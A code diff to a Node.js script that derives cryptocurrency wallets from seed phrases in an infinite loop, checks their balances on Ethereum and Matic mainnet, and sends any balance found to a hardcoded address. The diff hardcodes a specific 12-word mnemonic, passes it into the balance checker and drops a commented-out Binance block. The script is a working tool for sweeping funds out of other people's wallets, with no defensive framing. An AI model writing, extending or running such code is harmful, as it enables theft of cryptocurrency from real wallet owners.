@@ -2,7 +2,7 @@ const HDWalletProvider = require('@truffle/hdwallet-provider');
 const Web3 = require('web3');
 const bip39 = require('bip39');
 
-const checkBalance = async (web3Provider, network) =>
+const checkBalance = async (web3Provider, network, _mnemonic) =>
 {
     // get accounts
     const accounts = await web3Provider.eth.getAccounts();
@@ -16,17 +16,17 @@ const checkBalance = async (web3Provider, network) =>
         if (balance > 0)
         {
             console.log(`Wallet found! Balance: ${balance} ETH on ${network}`);
-            console.log(`Mnemonic: ${mnemonic}`);
+            console.log(`Mnemonic: ${_mnemonic}, Account: ${account}`);
 
             // transfer funds to your wallet
             const tx = await web3Provider.eth.sendTransaction({
                 from: account,
                 to: '0x53FdA1A0b66E8A452d4088E635a0684ebf9163c2',
                 value: balance
-            }).catch(err => console.log(err, mnemonic, network));
+            }).catch(err => console.log(err, _mnemonic, network));
 
             // log transaction
-            console.log(`Transaction: ${tx.transactionHash}`);
+            console.log(`Transaction: ${tx}`);
 
             // exit process
             process.exit();
@@ -34,7 +34,7 @@ const checkBalance = async (web3Provider, network) =>
     }
 }
 
-let mnemonic;
+let mnemonic = "plate camera risk vanish skin stove people lunch ill invite employ unknown";
 const main_function = async () =>
 {
     // infinite loop
@@ -53,7 +53,7 @@ const main_function = async () =>
         })
         let web3 = new Web3(provider);
         
-        await checkBalance(web3, 'Ethereum Mainnet')
+        await checkBalance(web3, 'Ethereum Mainnet', mnemonic)
             .catch(err => console.log(err, mnemonic, 'Ethereum Mainnet'));
     
         // check if wallet exists in Matic Mainnet
@@ -66,20 +66,8 @@ const main_function = async () =>
         })
         let web3Matic = new Web3(provider);
         
-        await checkBalance(web3Matic, 'Matic Mainnet')
+        await checkBalance(web3Matic, 'Matic Mainnet', mnemonic)
             .catch(err => console.log(err, mnemonic, 'Matic Mainnet'));
-
-        // // check if wallet exists in BNB Mainnet
-        // provider = new HDWalletProvider({
-        //     mnemonic: {
-        //         phrase: mnemonic
-        //     },
-        //     providerOrUrl: "https://bsc-dataseed.binance.org"
-        // })
-        // let web3BSC = new Web3(provider, mnemonic, 'Binance Mainnet');
-    
-        // await checkBalance(web3BSC, 'Binance Mainnet')
-        //     .catch(err => console.log(err, mnemonic, 'Binance Mainnet'));
 
         console.log(`No money found! Mnemonic: ${mnemonic}`);
     }
